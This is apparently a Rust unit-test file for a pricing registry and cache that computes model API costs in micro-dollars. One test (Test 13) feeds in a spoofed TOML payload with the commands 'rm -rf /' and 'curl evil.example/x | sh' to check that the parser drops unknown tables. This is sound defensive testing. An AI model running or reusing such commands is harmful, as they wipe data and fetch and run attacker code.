// Phase 36.2 Plan 04 — pricing registry + disk-cache resolution-chain tests.
//
// Mirrors Phase 21.3's model_metadata.rs / models_cache.rs structure:
// - lookup resolution chain (cache > table > prefix-strip > None)
// - lookup_or_zero graceful fallback
// - compute_cost_micros Anthropic 3-input billable formula
// - PricingCache round-trip / missing-file / corrupt-file safety
// - strict TOML parsing against spoofed refresh payloads (T-36.2-04-PARSE)

use std::collections::HashMap;

use ironhermes_core::pricing::{PricingEntry, PricingRegistry, compute_cost_micros};
use ironhermes_core::pricing_cache::{PricingCache, PricingCacheEntry};

// ─────────────────────────────────────────────────────────────────────────────
// Test 1 — TOML bootstrap parses cleanly via include_str!
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn pricing_registry_new_parses_bundled_toml() {
    let reg = PricingRegistry::new();
    // Bundled table must contain claude-opus-4-7 (the critical $5/$25 row).
    assert!(
        reg.lookup("claude-opus-4-7").is_some(),
        "PricingRegistry::new() must load claude-opus-4-7 from pricing.toml"
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 2 — Resolution: cache overrides static table
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn lookup_cache_overrides_static_table() {
    let mut reg = PricingRegistry::new();
    // Pre-cache: returns static-table $5
    let before = reg.lookup("claude-opus-4-7").expect("table entry");
    assert_eq!(before.input_per_1m_micros, 5_000_000);

    // Override via merge_cache
    let mut entries = HashMap::new();
    entries.insert(
        "claude-opus-4-7".to_string(),
        PricingEntry {
            provider: "anthropic".to_string(),
            input_per_1m_micros: 999_000_000,
            output_per_1m_micros: 0,
            cache_read_per_1m_micros: 0,
            cache_creation_per_1m_micros: 0,
        },
    );
    reg.merge_cache(entries);

    let after = reg.lookup("claude-opus-4-7").expect("cached entry");
    assert_eq!(after.input_per_1m_micros, 999_000_000);
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 3 — Resolution: provider/ prefix strip
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn lookup_strips_provider_prefix() {
    let reg = PricingRegistry::new();
    let bare = reg.lookup("claude-opus-4-7").expect("bare lookup");
    let prefixed = reg
        .lookup("anthropic/claude-opus-4-7")
        .expect("prefix-stripped lookup");
    assert_eq!(bare.input_per_1m_micros, prefixed.input_per_1m_micros);
    assert_eq!(bare.output_per_1m_micros, prefixed.output_per_1m_micros);
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 4 — Graceful fallback: lookup_or_zero on unknown model
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn lookup_or_zero_returns_zero_entry_for_unknown_model() {
    let reg = PricingRegistry::new();
    let entry = reg.lookup_or_zero("nonexistent-model-xyz");
    assert_eq!(entry.input_per_1m_micros, 0);
    assert_eq!(entry.output_per_1m_micros, 0);
    assert_eq!(entry.cache_read_per_1m_micros, 0);
    assert_eq!(entry.cache_creation_per_1m_micros, 0);
    assert_eq!(entry.provider, "");
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 5 — Anthropic billable formula sums in_tok + cache_read + cache_create
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn compute_cost_micros_anthropic_three_input_formula() {
    let reg = PricingRegistry::new();
    let entry = reg.lookup("claude-opus-4-7").expect("opus 4.7");

    // 1M of each token type — exact micro-USD assertion.
    let cost = compute_cost_micros(entry, 1_000_000, 1_000_000, 1_000_000, 1_000_000);
    // input  = 1_000_000 * 5_000_000 / 1_000_000 = 5_000_000
    // output = 1_000_000 * 25_000_000 / 1_000_000 = 25_000_000
    // read   = 1_000_000 * 500_000 / 1_000_000   = 500_000
    // create = 1_000_000 * 6_250_000 / 1_000_000 = 6_250_000
    // total  = 36_750_000 micros = $36.75
    assert_eq!(cost, 36_750_000);
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 6 — Integer math avoids float drift on small token counts
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn compute_cost_micros_small_counts_integer_math() {
    let reg = PricingRegistry::new();
    let entry = reg.lookup("claude-opus-4-7").expect("opus 4.7");

    // 100 / 50 / 200 / 10 against $5 / $25 / $0.50 / $6.25
    // input  = 100 * 5_000_000 / 1_000_000 = 500
    // output = 50 * 25_000_000 / 1_000_000 = 1_250
    // read   = 200 * 500_000 / 1_000_000   = 100
    // create = 10 * 6_250_000 / 1_000_000  = 63 (62.5 → 63 via CR-03 round-to-nearest)
    // total  = 1_913 micros
    //
    // CR-03 fix (commit on develop): compute_cost_micros now adds 500_000
    // before dividing by 1_000_000 so the result rounds-to-nearest instead
    // of truncating-toward-zero. Pre-fix the create term was 62 (and short
    // Haiku/$0.25-class turns silently rounded down to $0); post-fix it is
    // 63, which is the correct billing value.
    let cost = compute_cost_micros(entry, 100, 50, 200, 10);
    assert_eq!(cost, 1_913);
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 7 — Unknown model → cost = 0 (combined with lookup_or_zero)
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn compute_cost_micros_unknown_model_returns_zero() {
    let reg = PricingRegistry::new();
    let entry = reg.lookup_or_zero("foobar");
    let cost = compute_cost_micros(&entry, 1_000_000, 1_000_000, 0, 0);
    assert_eq!(cost, 0);
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 8 — Regression guard: claude-opus-4-7 IS $5/$25 (not $15/$75)
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn claude_opus_4_7_is_five_dollar_input() {
    let reg = PricingRegistry::new();
    let entry = reg.lookup("claude-opus-4-7").expect("opus 4.7");
    assert_eq!(
        entry.input_per_1m_micros, 5_000_000,
        "claude-opus-4-7 must be $5/M input (new-tokenizer 4.x), NOT $15/M (CONTEXT.md sketch)"
    );
    assert_eq!(entry.output_per_1m_micros, 25_000_000);
    assert_eq!(entry.cache_read_per_1m_micros, 500_000);
    assert_eq!(entry.cache_creation_per_1m_micros, 6_250_000);
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 9 — Regression guard: claude-opus-4-20250514 IS $15/$75 (legacy)
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn claude_opus_4_20250514_is_fifteen_dollar_input() {
    let reg = PricingRegistry::new();
    let entry = reg
        .lookup("claude-opus-4-20250514")
        .expect("legacy opus 4");
    assert_eq!(
        entry.input_per_1m_micros, 15_000_000,
        "claude-opus-4-20250514 must be $15/M input (legacy April 2025 release)"
    );
    assert_eq!(entry.output_per_1m_micros, 75_000_000);
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 10 — PricingCache round-trip (serialize + deserialize)
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn pricing_cache_round_trip_through_json() {
    let mut cache = PricingCache::default();
    cache.entries.insert(
        "claude-opus-4-7".to_string(),
        PricingCacheEntry {
            pricing: PricingEntry {
                provider: "anthropic".to_string(),
                input_per_1m_micros: 5_000_000,
                output_per_1m_micros: 25_000_000,
                cache_read_per_1m_micros: 500_000,
                cache_creation_per_1m_micros: 6_250_000,
            },
            fetched_at: chrono::Utc::now(),
        },
    );

    let json = serde_json::to_string_pretty(&cache).expect("serialize");
    let decoded: PricingCache = serde_json::from_str(&json).expect("deserialize");
    let entry = decoded
        .entries
        .get("claude-opus-4-7")
        .expect("round-tripped entry");
    assert_eq!(entry.pricing.input_per_1m_micros, 5_000_000);
    assert_eq!(entry.pricing.output_per_1m_micros, 25_000_000);
    assert_eq!(entry.pricing.cache_read_per_1m_micros, 500_000);
    assert_eq!(entry.pricing.cache_creation_per_1m_micros, 6_250_000);
    assert_eq!(entry.pricing.provider, "anthropic");
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 11 — PricingCache::load() with missing file returns empty default
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn pricing_cache_load_from_missing_file_returns_default() {
    let path = std::path::Path::new("/nonexistent/path/pricing-cache.json");
    let cache = PricingCache::load_from(path);
    assert!(cache.entries.is_empty(), "missing file must yield default");
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 12 — PricingCache::load() with corrupt file returns empty default
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn pricing_cache_load_from_corrupt_file_returns_default() {
    let dir = tempfile::tempdir().expect("tempdir");
    let path = dir.path().join("bad-pricing-cache.json");
    std::fs::write(&path, "not valid json {{{").expect("write corrupt");
    let cache = PricingCache::load_from(&path);
    assert!(
        cache.entries.is_empty(),
        "corrupt file must yield default — never panic"
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 13 — Strict TOML parsing rejects spoofed payloads (T-36.2-04-PARSE)
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn pricing_registry_strict_toml_rejects_spoofed_payload() {
    // A payload with no `[models.*]` table — wrong-shape input must produce
    // an empty `models` map (the schema validator for Plan 09's
    // fetch_from_models_dev MUST additionally verify models.len() > 0).
    let spoofed = r#"
[exploit_payload]
shell = "rm -rf /"
remote_code = "curl evil.example/x | sh"
"#;
    let reg = PricingRegistry::from_toml_str(spoofed).expect("toml syntactically parses");
    // The spoofed [exploit_payload] table is silently dropped — there's no
    // matching field on PricingFile. The resulting models table is empty.
    assert!(
        reg.lookup("claude-opus-4-7").is_none(),
        "spoofed payload must NOT populate a models map; downstream must verify len()>0"
    );

    // Genuine garbage that can't even tokenize as TOML must return Err.
    let totally_invalid = "this is not toml at all ][[}}{";
    assert!(
        PricingRegistry::from_toml_str(totally_invalid).is_err(),
        "non-TOML input must return Err"
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// Test 14 — PricingCache::into_pricing_map strips wrapper
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn pricing_cache_into_pricing_map_unwraps_entries() {
    let mut cache = PricingCache::default();
    cache.entries.insert(
        "test-model".to_string(),
        PricingCacheEntry {
            pricing: PricingEntry {
                provider: "test".to_string(),
                input_per_1m_micros: 42,
                output_per_1m_micros: 84,
                cache_read_per_1m_micros: 0,
                cache_creation_per_1m_micros: 0,
            },
            fetched_at: chrono::Utc::now(),
        },
    );

    let map = cache.into_pricing_map();
    assert_eq!(map.len(), 1);
    let entry = map.get("test-model").expect("unwrapped");
    assert_eq!(entry.input_per_1m_micros, 42);
}
